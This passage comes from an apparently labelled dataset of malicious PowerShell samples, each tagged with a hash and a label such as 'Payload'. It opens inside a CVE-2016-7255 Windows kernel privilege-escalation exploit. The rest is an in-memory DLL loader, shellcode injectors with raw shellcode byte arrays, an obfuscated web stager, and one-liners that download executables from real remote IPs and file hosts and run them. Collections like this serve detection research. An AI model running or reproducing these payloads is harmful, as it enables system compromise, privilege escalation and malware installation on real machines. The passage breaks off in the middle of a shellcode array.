	$CallResult = [ms16135]::SwitchToThisWindow($hWndChild,$true)

	Do-AltShiftEsc

	
	
	
	
	
	function Trigger-Write {
		$SafeGuard = [diagnostics.stopwatch]::StartNew()
		while ($SafeGuard.ElapsedMilliseconds -lt 3000) {
			$tagMSG = New-Object tagMSG
			if ($([ms16135]::GetMessage([ref]$tagMSG,[IntPtr]::Zero,0,0))) {
				$CallResult = [ms16135]::SetFocus($hWndParent) 
				for ($i=0;$i-lt20;$i++){Do-AltShiftEsc}        
				$CallResult = [ms16135]::SetFocus($hWndChild)  
				for ($i=0;$i-lt20;$i++){Do-AltShiftEsc}        
				$CallResult = [ms16135]::TranslateMessage([ref]$tagMSG)
				$CallResult = [ms16135]::DispatchMessage([ref]$tagMSG)
			}
		} $SafeGuard.Stop()
	}
	[IntPtr]$Global:BytePointer = [ms16135]::VirtualAlloc([System.IntPtr]::Zero, 0x2000, 0x3000, 0x40)
	do {
		echo ""[+] Trying to trigger arbitrary 'Or'..""
		$ByteRead = [ms16135]::GetBitmapBits($WorkerBitmap.BitmapHandle,0x2000,$BytePointer)
		Trigger-Write
		$LoopCount += 1
	} while ($ByteRead -ne 0x2000 -And $LoopCount -lt 10)

	
	$CallResult = [ms16135]::DestroyWindow($hWndChild)
	$CallResult = [ms16135]::DestroyWindow($hWndParent)
	$CallResult = [ms16135]::UnregisterClass(""cve-2016-7255"",[IntPtr]::Zero)
	
	
	if ($LoopCount -eq 10) {
		echo ""`n[!] Bug did not trigger, try again or patched?`n""
		$Script:BugNotTriggered = 1
	}
}

Do-OrAddress -Address $TargetAddress
if ($BugNotTriggered) {
	Return
}



if ($OSMajorMinor -eq ""6.1"") {
	$SizeVal = 0x400000770
} else {
	$SizeVal = 0x400000760
}
do {
	$Read64 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount)
	if ($Read64 -eq $SizeVal) {
		$Pointer1 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount + 16)
		$Pointer2 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount + 24)
		if ($Pointer1 -eq $Pointer2) {
			$BufferOffset = $LoopCount + 16
			Break
		}
	}
	$LoopCount += 8
} while ($LoopCount -lt 0x2000)
$pvBits = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset)
$pvScan0 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset + 8)


if ($pvScan0 -ne 0) {
	echo ""`n[?] Success, reading beyond worker bitmap size!""
	echo ""[+] Old manager bitmap pvScan0: $('{0:X}' -f $pvScan0)""
} else {
	echo ""`n[!] Buffer contains invalid data, quitting..`n""
	Return
}


[System.Runtime.InteropServices.Marshal]::WriteInt64($($BytePointer.ToInt64() + $BufferOffset),$WorkerBitmap.BitmappvScan0)
[System.Runtime.InteropServices.Marshal]::WriteInt64($($BytePointer.ToInt64() + $BufferOffset + 8),$WorkerBitmap.BitmappvScan0)
$pvScan0 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset + 8)
echo ""[+] New manager bitmap pvScan0: $('{0:X}' -f $pvScan0)""


$CallResult = [ms16135]::SetBitmapBits($WorkerBitmap.BitmapHandle,0x2000,$BytePointer)


Bitmap-Elevate -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle",TaskExecution
6f29174ec48f535fde1eae498503829805b9a8da4f5802304576984d1d43b226,"function Out-ManagedDll
{
    [CmdletBinding()] Param (
        [Parameter(Mandatory = $True)]
        [String]
        $FilePath
    )

    $Path = Resolve-Path $FilePath

    if (! [IO.File]::Exists($Path))
    {
        Throw ""$Path does not exist.""
    }

    $FileBytes = [System.IO.File]::ReadAllBytes($Path)

    if (($FileBytes[0..1] | % {[Char]$_}) -join '' -cne 'MZ')
    {
        Throw ""$Path is not a valid executable.""
    }

    $Length = $FileBytes.Length
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($FileBytes, 0, $FileBytes.Length)
    $DeflateStream.Dispose()
    $CompressedFileBytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $EncodedCompressedFile = [Convert]::ToBase64String($CompressedFileBytes)

    Write-Verbose ""Compression ratio: $(($EncodedCompressedFile.Length/$FileBytes.Length).ToString('

    $Output = @""
`$EncodedCompressedFile = @'
$EncodedCompressedFile
'@
`$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(`$EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
`$UncompressedFileBytes = New-Object Byte[]($Length)
`$DeflatedStream.Read(`$UncompressedFileBytes, 0, $Length) | Out-Null
[Reflection.Assembly]::Load(`$UncompressedFileBytes)
""@

    Write-Output $Output
}",Payload
d42049b4f9b56780e0294a708203960599350dc4025132c30cc3bd4ef4cf96a3,"$Injector = @""
using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;

namespace Injector
{
    public class Shellcode
    {
		private static UInt32 VAR1 = 0x1000;
		private static UInt32 VAR2 = 0x40;
		
		[DllImport(""kernel32"")]
		private static extern UInt32 VirtualAlloc(UInt32 VAR3, UInt32 VAR4, UInt32 VAR5, UInt32 VAR6);
		
		[DllImport(""kernel32"")]
		private static extern UInt32 WaitForSingleObject(IntPtr VAR3, UInt32 VAR4);
		
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate IntPtr VAR10(IntPtr VAR3, UInt32 VAR4, IntPtr VAR5, IntPtr VAR6, UInt32 VAR7, UInt32 VAR8);
		
		[DllImport(""kernel32.dll"")]
		public static extern IntPtr LoadLibrary(string VAR3);
		
		[DllImport(""kernel32.dll"")]
		public static extern IntPtr GetProcAddress(IntPtr VAR3, string VAR4);
	

        static public void Exec(byte[] cmd)
        {
			IntPtr VAR11 = LoadLibrary(""kernel32.dll"");
			IntPtr VAR12 = GetProcAddress(VAR11, ""CreateThread"");
			VAR10 VAR13 = (VAR10)Marshal.GetDelegateForFunctionPointer(VAR12, typeof(VAR10));
			UInt32 VAR14 = VirtualAlloc(0, (UInt32)cmd.Length, VAR1, VAR2);
			Marshal.Copy(cmd, 0, (IntPtr)(VAR14), cmd.Length);
			IntPtr VAR15 = IntPtr.Zero;
			IntPtr VAR16 = IntPtr.Zero;
			VAR15 = VAR13(IntPtr.Zero, 0, (IntPtr)VAR14, VAR16, 0, 0);
			WaitForSingleObject(VAR15, 0xFFFFFFFF);
		}
    }
}
""@

Try {
    Add-Type -TypeDefinition $Injector -Language CSharp
} Catch {
    Write-Output ""CSharp already loaded""
}
[Injector.Shellcode]::Exec([Convert]::FromBase64String(""[PAYLOAD]""));
",Payload
8eda386f955d3e916fbc94d0033bdf6685ca5d6d7d7e95942ec4b985781a2f6a,"
($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://201.130.72.171/andac.exe', $dpl);Start-Process $dpl

",Payload
893a65fc23268d189aa82c156864c63c88f046ad7b2c3523c37baeaa78340319,"
$Wc=New-OBJeCt SysTem.NeT.WEbClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADErs.Add('User-Agent',$u);$wC.PRoXY = [SySTeM.Net.WebRequest]::DeFaULtWeBPrOXy;$wc.PrOXy.CreDEnTIALS = [SystEM.NEt.CRedENTiAlCAche]::DEFAuLTNEtWOrKCrEDEntIals;$K='0RjD+PC3zmT-$L\\h5g@

",Payload
d35ed6d7eccc327acf348cd73e94048718ca666f7b82fc7192cc3c0bf0815730,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd8,0xb8,0x75,0x49,0x93,0x61,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xed,0x89,0xab,0x66,0x9d,0x99,0xae,0x89,0x5e,0x59,0xcf,0x00,0xbb,0x68,0xcf,0x77,0xcf,0xda,0xff,0xfc,0x9d,0xd6,0x74,0x50,0x36,0x6d,0xf8,0x7d,0x39,0xc6,0xb7,0x5b,0x74,0xd7,0xe4,0x98,0x17,0x5b,0xf7,0xcc,0xf7,0x62,0x38,0x01,0xf9,0xa3,0x25,0xe8,0xab,0x7c,0x21,0x5f,0x5c,0x09,0x7f,0x5c,0xd7,0x41,0x91,0xe4,0x04,0x11,0x90,0xc5,0x9a,0x2a,0xcb,0xc5,0x1d,0xff,0x67,0x4c,0x06,0x1c,0x4d,0x06,0xbd,0xd6,0x39,0x99,0x17,0x27,0xc1,0x36,0x56,0x88,0x30,0x46,0x9e,0x2e,0xab,0x3d,0xd6,0x4d,0x56,0x46,0x2d,0x2c,0x8c,0xc3,0xb6,0x96,0x47,0x73,0x13,0x27,0x8b,0xe2,0xd0,0x2b,0x60,0x60,0xbe,0x2f,0x77,0xa5,0xb4,0x4b,0xfc,0x48,0x1b,0xda,0x46,0x6f,0xbf,0x87,0x1d,0x0e,0xe6,0x6d,0xf3,0x2f,0xf8,0xce,0xac,0x95,0x72,0xe2,0xb9,0xa7,0xd8,0x6a,0x0d,0x8a,0xe2,0x6a,0x19,0x9d,0x91,0x58,0x86,0x35,0x3e,0xd0,0x4f,0x90,0xb9,0x17,0x7a,0x64,0x55,0xe6,0x85,0x95,0x7f,0x2c,0xd1,0xc5,0x17,0x85,0x5a,0x8e,0xe7,0x2a,0x8f,0x01,0xb8,0x84,0x60,0xe2,0x68,0x64,0xd1,0x8a,0x62,0x6b,0x0e,0xaa,0x8c,0xa6,0x27,0x41,0x76,0x20,0x3d,0x95,0xe2,0xc1,0xd5,0x9b,0x12,0x30,0x7a,0x15,0xf4,0x58,0x92,0x73,0xae,0xf4,0x0b,0xde,0x24,0x65,0xd3,0xf4,0x40,0xa5,0x5f,0xfb,0xb5,0x6b,0xa8,0x76,0xa6,0x1b,0x58,0xcd,0x94,0x8d,0x67,0xfb,0xb3,0x31,0xf2,0x00,0x12,0x66,0x6a,0x0b,0x43,0x40,0x35,0xf4,0xa6,0xdb,0xfc,0x60,0x09,0xb3,0x00,0x65,0x89,0x43,0x57,0xef,0x89,0x2b,0x0f,0x4b,0xda,0x4e,0x50,0x46,0x4e,0xc3,0xc5,0x69,0x27,0xb0,0x4e,0x02,0xc5,0xef,0xb9,0x8d,0x36,0xda,0x3b,0xf1,0xe0,0x22,0x4e,0x1b,0x31;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
0d2e4e7c754b59cc1ca4e0cc78508208b3a1fd391e435f84ad1ee8b4483e143b,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd0,0xb8,0xd6,0x62,0x05,0x7e,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x31,0x43,0x18,0x03,0x43,0x18,0x83,0xc3,0xd2,0x80,0xf0,0x82,0x32,0xc6,0xfb,0x7a,0xc2,0xa7,0x72,0x9f,0xf3,0xe7,0xe1,0xeb,0xa3,0xd7,0x62,0xb9,0x4f,0x93,0x27,0x2a,0xc4,0xd1,0xef,0x5d,0x6d,0x5f,0xd6,0x50,0x6e,0xcc,0x2a,0xf2,0xec,0x0f,0x7f,0xd4,0xcd,0xdf,0x72,0x15,0x0a,0x3d,0x7e,0x47,0xc3,0x49,0x2d,0x78,0x60,0x07,0xee,0xf3,0x3a,0x89,0x76,0xe7,0x8a,0xa8,0x57,0xb6,0x81,0xf2,0x77,0x38,0x46,0x8f,0x31,0x22,0x8b,0xaa,0x88,0xd9,0x7f,0x40,0x0b,0x08,0x4e,0xa9,0xa0,0x75,0x7f,0x58,0xb8,0xb2,0x47,0x83,0xcf,0xca,0xb4,0x3e,0xc8,0x08,0xc7,0xe4,0x5d,0x8b,0x6f,0x6e,0xc5,0x77,0x8e,0xa3,0x90,0xfc,0x9c,0x08,0xd6,0x5b,0x80,0x8f,0x3b,0xd0,0xbc,0x04,0xba,0x37,0x35,0x5e,0x99,0x93,0x1e,0x04,0x80,0x82,0xfa,0xeb,0xbd,0xd5,0xa5,0x54,0x18,0x9d,0x4b,0x80,0x11,0xfc,0x03,0x65,0x18,0xff,0xd3,0xe1,0x2b,0x8c,0xe1,0xae,0x87,0x1a,0x49,0x26,0x0e,0xdc,0xae,0x1d,0xf6,0x72,0x51,0x9e,0x07,0x5a,0x95,0xca,0x57,0xf4,0x3c,0x73,0x3c,0x04,0xc1,0xa6,0x93,0x54,0x6d,0x19,0x54,0x05,0xcd,0xc9,0x3c,0x4f,0xc2,0x36,0x5c,0x70,0x09,0x5f,0xf7,0x8a,0xd9,0x49,0x26,0xa0,0xed,0xe2,0x34,0xca,0x1c,0xaf,0xb1,0x2c,0x74,0x5f,0x94,0xe7,0xe0,0xc6,0xbd,0x7c,0x91,0x07,0x68,0xf9,0x91,0x8c,0x9f,0xfd,0x5f,0x65,0xd5,0xed,0x37,0x85,0xa0,0x4c,0x91,0x9a,0x1e,0xfa,0x1d,0x0f,0xa5,0xad,0x4a,0xa7,0xa7,0x88,0xbc,0x68,0x57,0xff,0xb7,0xa1,0xcd,0x40,0xaf,0xcd,0x01,0x41,0x2f,0x98,0x4b,0x41,0x47,0x7c,0x28,0x12,0x72,0x83,0xe5,0x06,0x2f,0x16,0x06,0x7f,0x9c,0xb1,0x6e,0x7d,0xfb,0xf6,0x30,0x7e,0x2e,0x07,0x0c,0xa9,0x16,0x7d,0x7c,0x69;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7322d4f92e24180de072cf9f4357bcf573334d26f7be13617d3c21d1c3cb0c5b,"
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/hsmqrh.exe',""$env:TEMP\\winreg.exe"");Start-Process (""$env:TEMP\\winreg.exe"")

",Payload
541562ed9d430f0f394efda7e10074ed88e0cb4a2c0cece1e91d599fcc1798b3,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x2e,0x9f,0xc0,0xe4,0xdb,0xd5,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x42,0x13,0x03,0x42,0x13,0x83,0xea,0xd2,0x7d,0x35,0x18,0xc2,0x00,0xb6,0xe1,0x12,0x65,0x3e,0x04,0x23,0xa5,0x24,0x4c,0x13,0x15,0x2e,0x00,0x9f,0xde,0x62,0xb1,0x14,0x92,0xaa,0xb6,0x9d,0x19,0x8d,0xf9,0x1e,0x31,0xed,0x98,0x9c,0x48,0x22,0x7b,0x9d,0x82,0x37,0x7a,0xda,0xff,0xba,0x2e,0xb3,0x74,0x68,0xdf,0xb0,0xc1,0xb1,0x54,0x8a,0xc4,0xb1,0x89,0x5a,0xe6,0x90,0x1f,0xd1,0xb1,0x32,0xa1,0x36,0xca,0x7a,0xb9,0x5b,0xf7,0x35,0x32,0xaf,0x83,0xc7,0x92,0xfe,0x6c,0x6b,0xdb,0xcf,0x9e,0x75,0x1b,0xf7,0x40,0x00,0x55,0x04,0xfc,0x13,0xa2,0x77,0xda,0x96,0x31,0xdf,0xa9,0x01,0x9e,0xde,0x7e,0xd7,0x55,0xec,0xcb,0x93,0x32,0xf0,0xca,0x70,0x49,0x0c,0x46,0x77,0x9e,0x85,0x1c,0x5c,0x3a,0xce,0xc7,0xfd,0x1b,0xaa,0xa6,0x02,0x7b,0x15,0x16,0xa7,0xf7,0xbb,0x43,0xda,0x55,0xd3,0xa0,0xd7,0x65,0x23,0xaf,0x60,0x15,0x11,0x70,0xdb,0xb1,0x19,0xf9,0xc5,0x46,0x5e,0xd0,0xb2,0xd9,0xa1,0xdb,0xc2,0xf0,0x65,0x8f,0x92,0x6a,0x4c,0xb0,0x78,0x6b,0x71,0x65,0x14,0x6e,0xe5,0x46,0x41,0x14,0xf8,0x2e,0x90,0xd5,0x1c,0xce,0x1d,0x33,0x70,0x40,0x4e,0xec,0x30,0x30,0x2e,0x5c,0xd8,0x5a,0xa1,0x83,0xf8,0x64,0x6b,0xac,0x92,0x8a,0xc2,0x84,0x0a,0x32,0x4f,0x5e,0xab,0xbb,0x45,0x1a,0xeb,0x30,0x6a,0xda,0xa5,0xb0,0x07,0xc8,0x51,0x31,0x52,0xb2,0xf7,0x4e,0x48,0xd9,0xf7,0xda,0x77,0x48,0xa0,0x72,0x7a,0xad,0x86,0xdc,0x85,0x98,0x9d,0xd5,0x13,0x63,0xc9,0x19,0xf4,0x63,0x09,0x4c,0x9e,0x63,0x61,0x28,0xfa,0x37,0x94,0x37,0xd7,0x2b,0x05,0xa2,0xd8,0x1d,0xfa,0x65,0xb1,0xa3,0x25,0x41,0x1e,0x5b,0x00,0x53,0x62,0x8a,0x6c,0x21,0x8a,0x0e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
1479307c7f9399e7cafc34176dc9c065ca1085dfe3e65ee154f16e389903efca,"
(New-Object System.Net.WebClient).DownloadFile('http://185.45.193.169/update.exe',""$env:TEMP\\puttyx86.exe"");Start-Process (""$env:TEMP\\puttyx86.exe"")

",Payload
105e1b35b955e0e448218dd7a2f641a7a830fec6948ac03dada72841fde84607,"
$dUa5 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $dUa5 -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x60,0x83,0x2c,0x25,0xdb,0xc9,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x4e,0x83,0xee,0xfc,0x31,0x6e,0x10,0x03,0x6e,0x10,0x82,0x76,0xd0,0xcd,0xc0,0x79,0x29,0x0e,0xa4,0xf0,0xcc,0x3f,0xe4,0x67,0x84,0x10,0xd4,0xec,0xc8,0x9c,0x9f,0xa1,0xf8,0x17,0xed,0x6d,0x0e,0x9f,0x5b,0x48,0x21,0x20,0xf7,0xa8,0x20,0xa2,0x05,0xfd,0x82,0x9b,0xc6,0xf0,0xc3,0xdc,0x3a,0xf8,0x96,0xb5,0x31,0xaf,0x06,0xb1,0x0f,0x6c,0xac,0x89,0x9e,0xf4,0x51,0x59,0xa1,0xd5,0xc7,0xd1,0xf8,0xf5,0xe6,0x36,0x71,0xbc,0xf0,0x5b,0xbf,0x76,0x8a,0xa8,0x34,0x89,0x5a,0xe1,0xb5,0x26,0xa3,0xcd,0x44,0x36,0xe3,0xea,0xb6,0x4d,0x1d,0x09,0x4b,0x56,0xda,0x73,0x97,0xd3,0xf9,0xd4,0x5c,0x43,0x26,0xe4,0xb1,0x12,0xad,0xea,0x7e,0x50,0xe9,0xee,0x81,0xb5,0x81,0x0b,0x0a,0x38,0x46,0x9a,0x48,0x1f,0x42,0xc6,0x0b,0x3e,0xd3,0xa2,0xfa,0x3f,0x03,0x0d,0xa3,0xe5,0x4f,0xa0,0xb0,0x97,0x0d,0xad,0x75,0x9a,0xad,0x2d,0x11,0xad,0xde,0x1f,0xbe,0x05,0x49,0x2c,0x37,0x80,0x8e,0x53,0x62,0x74,0x00,0xaa,0x8c,0x85,0x08,0x69,0xd8,0xd5,0x22,0x58,0x60,0xbe,0xb2,0x65,0xb5,0x11,0xe3,0xc9,0x65,0xd2,0x53,0xaa,0xd5,0xba,0xb9,0x25,0x0a,0xda,0xc1,0xef,0x23,0xf3,0x2c,0x10,0x4b,0x04,0x61,0x24,0x78,0x34,0xf1,0x25,0x13,0x55,0xdf,0xc1,0x8f,0xfb,0x6c,0x24,0x21,0x61,0xe7,0x38,0xd5,0xc0,0x2f,0x0d,0xa5,0xec,0xe5,0xe6,0xe5,0x0e,0x6c,0xfc,0xb5,0x46,0x72,0xfe,0x2f,0x9d,0xfb,0x18,0x25,0xb1,0xad,0xb3,0xd1,0x28,0xf4,0x48,0x40,0xb4,0x22,0x35,0x42,0x3e,0xc1,0xc9,0x0c,0xb7,0xac,0xd9,0xf8,0x37,0xfb,0x80,0xae,0x48,0xd1,0xaf,0x4e,0xdd,0xde,0x79,0x19,0x49,0xdd,0x5c,0x6d,0xd6,0x1e,0x8b,0xe6,0xdf,0x8a,0x74,0x90,0x1f,0x5b,0x75,0x60,0x76,0x31,0x75,0x08,0x2e,0x61,0x26,0x2d,0x31,0xbc,0x5a,0xfe,0xa4,0x3f,0x0b,0x53,0x6e,0x28,0xb1,0x8a,0x58,0xf7,0x4a,0xf9,0x58,0xcb,0x9c,0xc7,0x2e,0x25,0x1d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$NCDn=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($NCDn.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$NCDn,0,0,0);for (;;){Start-sleep 60};

",Payload
16c4c708339a3b344f4861e9a4f644e5db2d6e7ca2becddb449afaca6d2d5786,"
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/vjadwb.exe',""$env:TEMP\\euioko.exe"");Start-Process (""$env:TEMP\\euioko.exe"")

",Payload
7eadf108a1c39d23910edbf548b5fce349c8b32478223ee22f41e02947d2c160,"
$q0I = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $q0I -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc2,0xd9,0x74,0x24,0xf4,0xba,0x75,0xc7,0xca,0x2e,0x5e,0x31,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0x89,0x25,0x3f,0xd2,0x99,0x28,0xc0,0x2b,0x59,0x4d,0x48,0xce,0x68,0x4d,0x2e,0x9a,0xda,0x7d,0x24,0xce,0xd6,0xf6,0x68,0xfb,0x6d,0x7a,0xa5,0x0c,0xc6,0x31,0x93,0x23,0xd7,0x6a,0xe7,0x22,0x5b,0x71,0x34,0x85,0x62,0xba,0x49,0xc4,0xa3,0xa7,0xa0,0x94,0x7c,0xa3,0x17,0x09,0x09,0xf9,0xab,0xa2,0x41,0xef,0xab,0x57,0x11,0x0e,0x9d,0xc9,0x2a,0x49,0x3d,0xeb,0xff,0xe1,0x74,0xf3,0x1c,0xcf,0xcf,0x88,0xd6,0xbb,0xd1,0x58,0x27,0x43,0x7d,0xa5,0x88,0xb6,0x7f,0xe1,0x2e,0x29,0x0a,0x1b,0x4d,0xd4,0x0d,0xd8,0x2c,0x02,0x9b,0xfb,0x96,0xc1,0x3b,0x20,0x27,0x05,0xdd,0xa3,0x2b,0xe2,0xa9,0xec,0x2f,0xf5,0x7e,0x87,0x4b,0x7e,0x81,0x48,0xda,0xc4,0xa6,0x4c,0x87,0x9f,0xc7,0xd5,0x6d,0x71,0xf7,0x06,0xce,0x2e,0x5d,0x4c,0xe2,0x3b,0xec,0x0f,0x6a,0x8f,0xdd,0xaf,0x6a,0x87,0x56,0xc3,0x58,0x08,0xcd,0x4b,0xd0,0xc1,0xcb,0x8c,0x17,0xf8,0xac,0x03,0xe6,0x03,0xcd,0x0a,0x2c,0x57,0x9d,0x24,0x85,0xd8,0x76,0xb5,0x2a,0x0d,0xe2,0xb0,0xbc,0x6e,0x5b,0xbb,0x1e,0x07,0x9e,0xbc,0x5f,0x6d,0x17,0x5a,0x0f,0xc1,0x78,0xf3,0xef,0xb1,0x38,0xa3,0x87,0xdb,0xb6,0x9c,0xb7,0xe3,0x1c,0xb5,0x5d,0x0c,0xc9,0xed,0xc9,0xb5,0x50,0x65,0x68,0x39,0x4f,0x03,0xaa,0xb1,0x7c,0xf3,0x64,0x32,0x08,0xe7,0x10,0xb2,0x47,0x55,0xb6,0xcd,0x7d,0xf0,0x36,0x58,0x7a,0x53,0x61,0xf4,0x80,0x82,0x45,0x5b,0x7a,0xe1,0xde,0x52,0xee,0x4a,0x88,0x9a,0xfe,0x4a,0x48,0xcd,0x94,0x4a,0x20,0xa9,0xcc,0x18,0x55,0xb6,0xd8,0x0c,0xc6,0x23,0xe3,0x64,0xbb,0xe4,0x8b,0x8a,0xe2,0xc3,0x13,0x74,0xc1,0xd5,0x68,0xa3,0x2f,0xa0,0x80,0x77;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$VWT=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($VWT.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$VWT,0,0,0);for (;;){Start-sleep 60};

",Payload
3fba07ab8b2af317bc2a36d16c480b2eaa6ca1eacbb90834d2c8b6c79feb45c4,"
$OSiJ = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $OSiJ -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x8c,0x2a,0x9d,0x05,0xda,0xce,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x4d,0x31,0x50,0x14,0x83,0xc0,0x04,0x03,0x50,0x10,0x6e,0xdf,0x61,0xed,0xec,0x20,0x9a,0xee,0x90,0xa9,0x7f,0xdf,0x90,0xce,0xf4,0x70,0x20,0x84,0x59,0x7d,0xcb,0xc8,0x49,0xf6,0xb9,0xc4,0x7e,0xbf,0x77,0x33,0xb0,0x40,0x2b,0x07,0xd3,0xc2,0x31,0x54,0x33,0xfa,0xfa,0xa9,0x32,0x3b,0xe6,0x40,0x66,0x94,0x6d,0xf6,0x97,0x91,0x3b,0xcb,0x1c,0xe9,0xaa,0x4b,0xc0,0xba,0xcd,0x7a,0x57,0xb0,0x94,0x5c,0x59,0x15,0xad,0xd4,0x41,0x7a,0x8b,0xaf,0xfa,0x48,0x60,0x2e,0x2b,0x81,0x89,0x9d,0x12,0x2d,0x78,0xdf,0x53,0x8a,0x62,0xaa,0xad,0xe8,0x1f,0xad,0x69,0x92,0xfb,0x38,0x6a,0x34,0x88,0x9b,0x56,0xc4,0x5d,0x7d,0x1c,0xca,0x2a,0x09,0x7a,0xcf,0xad,0xde,0xf0,0xeb,0x26,0xe1,0xd6,0x7d,0x7c,0xc6,0xf2,0x26,0x27,0x67,0xa2,0x82,0x86,0x98,0xb4,0x6c,0x77,0x3d,0x